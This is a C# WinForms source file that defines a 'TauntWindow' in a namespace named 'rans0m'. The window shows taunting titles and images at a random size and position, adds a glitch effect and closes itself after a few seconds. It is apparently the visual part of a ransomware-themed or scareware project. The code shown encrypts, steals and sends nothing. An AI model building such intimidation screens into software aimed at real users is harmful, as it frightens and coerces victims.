namespace rans0m
{
    public partial class TauntWindow : Form
    {
        private readonly int _cycleIndex;
        public TauntWindow(int cycleIndex = -1)
        {
            _cycleIndex = cycleIndex;
            InitializeComponent();
        }

        private void TauntWindow_Load(object sender, EventArgs e)
        {
            try
            {
                // Cycle to a different title/image each time instead of random repeats
                int ti = _cycleIndex >= 0 ? _cycleIndex % Global.tauntTitles.Count : Global.RngNext(Global.tauntTitles.Count);
                int ii = _cycleIndex >= 0 ? (_cycleIndex + 1) % Global.tauntImages.Count : Global.RngNext(Global.tauntImages.Count);
                Text = Global.tauntTitles[ti];
                BackgroundImage = Global.tauntImages[ii];
                int w = Global.RngNext(200, 400);
                int h = Global.RngNext(200, 400);
                Size = new Size(w, h);
                MaximumSize = Size;
                MinimumSize = Size;
            }
            catch { }

            Global.RandomPosControl(this);

            _ = Task.Run(() => Global.GlitchIdle(this, false, 14));

            _ = Task.Run(async () =>
            {
                try { await Task.Delay(Global.RngNext(4000, 10 * 1000)); } catch { }
                if (IsDisposed || !IsHandleCreated) return;
                try { this.Invoke(() => { if (!IsDisposed) Dispose(); }); } catch { }
            });
        }
    }
}
